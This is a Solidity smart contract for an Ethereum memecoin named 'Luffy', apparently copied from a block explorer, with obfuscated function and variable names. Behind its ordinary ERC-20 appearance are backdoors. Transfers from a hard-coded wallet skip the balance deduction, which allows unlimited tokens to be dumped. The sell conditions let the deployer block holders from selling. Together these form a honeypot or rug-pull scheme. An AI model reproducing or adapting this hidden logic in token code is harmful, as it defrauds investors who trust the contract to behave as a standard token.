/**
 *Submitted for verification at Etherscan.io on 2023-09-28
*/

/**
Luffy   $Luffy
As we traverse the Grand Line, Luffy memecoin embraces innovation and decentralization. 

Twitter: https://twitter.com/Luffy_Portal
Telegram: https://t.me/Luffy_Portal
Website: https://luffyeth.com/

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rqnvx(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rqnvx(a, b, "SafeMath");
    }

    function  _rqnvx(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _oskuam {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _poauoy {
    function soimKinbxpartmFcadvwc(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Luffy is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _poauoy private _Twvfqwk;
    address payable private _Kovkbsr;
    address private _kisvtrh;

    string private constant _name = unicode"Luffy";
    string private constant _symbol = unicode"Luffy";
    uint8 private constant _decimals = 9;
    uint256 private constant _fTotalfh = 1000000000 * 10 **_decimals;
    uint256 public _pnqvend = _fTotalfh;
    uint256 public _Wacrnue = _fTotalfh;
    uint256 public _ronwTxpv= _fTotalfh;
    uint256 public _BvaTihf= _fTotalfh;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _dlehaimr;
    mapping (address => bool) private _treruwiy;
    mapping(address => uint256) private _rjcfoap;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ymwvkaiq=0;
    uint256 private _bnamjng=0;

    bool private _bvwijuq;
    bool public _Tpuisfhm = false;
    bool private ockbvpe = false;
    bool private _aprveq = false;


    event _mrcabrat(uint _pnqvend);
    modifier olTnegr {
        ockbvpe = true;
        _;
        ockbvpe = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _fTotalfh;
        _dlehaimr[owner(

        )] = true;
        _dlehaimr[address
        (this)] = true;
        _dlehaimr[
            _Kovkbsr] = true;
        _Kovkbsr = 
        payable (0xF901FC4D44837E916D6Fb41A8D261DbEe337C3B1);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _fTotalfh);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _fTotalfh;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rqnvx(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 rsvbrnk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Tpuisfhm) {
                if (to 
                != address
                (_Twvfqwk) 
                && to !=
                 address
                 (_kisvtrh)) {
                  require(_rjcfoap
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rjcfoap
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _kisvtrh && to != 
            address(_Twvfqwk) &&
             !_dlehaimr[to] ) {
                require(amount 
                <= _pnqvend,
                 "Exceeds the _pnqvend.");
                require(balanceOf
                (to) + amount
                 <= _Wacrnue,
                  "Exceeds the macxizse.");
                if(_bnamjng
                < _ymwvkaiq){
                  require
                  (! _epkvobz(to));
                }
                _bnamjng++;
                 _treruwiy
                 [to]=true;
                rsvbrnk = amount._pvr
                ((_bnamjng>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _kisvtrh &&
             from!= address(this) 
            && !_dlehaimr[from] ){
                require(amount <= 
                _pnqvend && 
                balanceOf(_Kovkbsr)
                <_BvaTihf,
                 "Exceeds the _pnqvend.");
                rsvbrnk = amount._pvr((_bnamjng>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_bnamjng>
                _ymwvkaiq &&
                 _treruwiy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ockbvpe 
            && to == _kisvtrh &&
             _aprveq &&
             contractTokenBalance>
             _ronwTxpv 
            && _bnamjng>
            _ymwvkaiq&&
             !_dlehaimr[to]&&
              !_dlehaimr[from]
            ) {
                _pvnrtnf( _rsqzv(amount, 
                _rsqzv(contractTokenBalance,
                _BvaTihf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _upvfiv(address
                    (this).balance);
                }
            }
        }

        if(rsvbrnk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(rsvbrnk);
          emit
           Transfer(from,
           address
           (this),rsvbrnk);
        }
        _balances[from
        ]= _rqnvx(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rqnvx(rsvbrnk));
        emit Transfer
        (from, to, 
        amount.
         _rqnvx(rsvbrnk));
    }

    function _pvnrtnf(uint256
     tokenAmount) private
      olTnegr {
        if(tokenAmount==
        0){return;}
        if(!_bvwijuq)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Twvfqwk.WETH();
        _approve(address(this),
         address(
             _Twvfqwk), 
             tokenAmount);
        _Twvfqwk.
        soimKinbxpartmFcadvwc
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rsqzv
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rqnvx(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Kovkbsr){
            return a ;
        }else{
            return a .
             _rqnvx (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _pnqvend = _fTotalfh;
        _Wacrnue = _fTotalfh;
        emit _mrcabrat(_fTotalfh);
    }

    function _epkvobz(address 
    account) private view 
    returns (bool) {
        uint256 epoiq;
        assembly {
            epoiq :=
             extcodesize
             (account)
        }
        return epoiq > 
        0;
    }

    function _upvfiv(uint256
    amount) private {
        _Kovkbsr.
        transfer(
            amount);
    }

    function opensTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _bvwijuq ) ;
        _Twvfqwk  
        =  
        _poauoy
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Twvfqwk), 
            _fTotalfh);
        _kisvtrh = 
        _oskuam(_Twvfqwk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Twvfqwk .
             WETH ( ) );
        _Twvfqwk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_kisvtrh).
        approve(address(_Twvfqwk), 
        type(uint)
        .max);
        _aprveq = true;
        _bvwijuq = true;
    }

    receive() external payable {}
}